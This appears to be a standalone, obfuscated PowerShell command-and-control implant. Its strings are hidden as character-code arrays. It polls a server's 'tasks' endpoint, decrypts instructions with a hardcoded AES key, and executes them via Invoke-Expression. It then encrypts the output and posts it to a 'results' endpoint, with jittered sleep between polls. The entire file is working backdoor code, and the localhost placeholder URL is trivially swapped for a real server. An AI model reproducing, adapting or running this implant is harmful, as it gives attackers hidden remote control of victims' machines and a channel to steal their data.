$URL="http://127.0.0.1"
$_____=[System.Text.Encoding]::UTF8
$______=(-join (@(49,50,51,52,53,54,55,56,57,48,49,50,51,52,53,54)|%{[char]$_}))
$_______=$_____.GetBytes($______)
$________=$_____.GetBytes($______)
$_________=New-Object -TypeName "$(-join (@(83,121,115,116,101,109)|%{[char]$_})).$(-join (@(83,101,99,117,114,105,116,121)|%{[char]$_})).$(-join (@(67,114,121,112,116,111,103,114,97,112,104,121)|%{[char]$_})).$(-join (@(65,101,115,77,97,110,97,103,101,100)|%{[char]$_}))"
$_________.Key=$_______
$_________.IV=$________
$_________.Mode=[System.Security.Cryptography.CipherMode]::CBC
$_________.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
${-}={param($a);$b=$_________.CreateDecryptor();$c=[System.Convert]::FromBase64String($a);$d=$b.TransformFinalBlock($c,0,$c.Length);return $_____.GetString($d)}
${--}={param($e);$f=$_________.CreateEncryptor();$g=$_____.GetBytes($e);$h=$f.TransformFinalBlock($g,0,$g.Length);return [System.Convert]::ToBase64String($h)}
while($true){try{$i=Invoke-RestMethod -Uri "$URL/$(-join(@(116,97,115,107,115)|%{[char]$_}))" -Method Get -ErrorAction Stop;$j=(&${-} $i);if($j -ne (-join(@(73,68,76,69)|%{[char]$_}))){$k=Invoke-Expression $j|Out-String;if([string]::IsNullOrWhiteSpace($k)){$k="[OK]"};$l=(&${--} $k);Invoke-RestMethod -Uri "$URL/$(-join(@(114,101,115,117,108,116,115)|%{[char]$_}))" -Method Post -Body $l -ContentType (-join(@(116,101,120,116,47,112,108,97,105,110)|%{[char]$_})) -ErrorAction Stop}}catch{};Start-Sleep -Seconds (5+(Get-Random -Minimum -1 -Maximum 2))}
